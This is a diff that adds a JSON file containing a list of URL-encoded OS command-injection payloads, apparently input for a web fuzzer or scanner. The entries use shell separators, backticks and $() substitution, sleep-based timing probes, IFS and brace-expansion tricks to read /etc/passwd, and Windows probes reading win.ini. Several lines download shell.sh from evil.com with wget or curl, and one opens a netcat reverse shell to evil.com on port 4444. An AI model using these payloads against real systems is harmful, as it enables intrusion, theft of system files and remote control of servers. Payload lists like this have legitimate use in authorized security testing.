@@ -1,0 +1,29 @@
+{
+  "cmdi": [
+    "%3Bid",
+    "%7Cid",
+    "%7C%7Cid",
+    "%26%26id",
+    "%60id%60",
+    "%24%28id%29",
+    "%0aid",
+    "%0did",
+    "%3Bsleep%205",
+    "%7Csleep%205",
+    "%24%28sleep%205%29",
+    "%60sleep%205%60",
+    "%3Bcat%24IFS%2Fetc%2Fpasswd",
+    "%7Ccat%24IFS%2Fetc%2Fpasswd",
+    "%3B%7Bcat%2C%2Fetc%2Fpasswd%7D",
+    "%3Bcat%24%40%2Fetc%2Fpasswd",
+    "%3Bcat%20%2Fetc%2Fpasswd",
+    "%7Ccat%20%2Fetc%2Fpasswd",
+    "%3Bwget%20http%3A%2F%2Fevil.com%2Fshell.sh",
+    "%3Bcurl%20http%3A%2F%2Fevil.com%2Fshell.sh",
+    "%3Bnc%20-e%20%2Fbin%2Fsh%20evil.com%204444",
+    "%26%20whoami%20%26",
+    "%3Buname%20-a",
+    "%26%20dir",
+    "%7C%20type%20C%3A%5CWindows%5Cwin.ini"
+  ]
+}
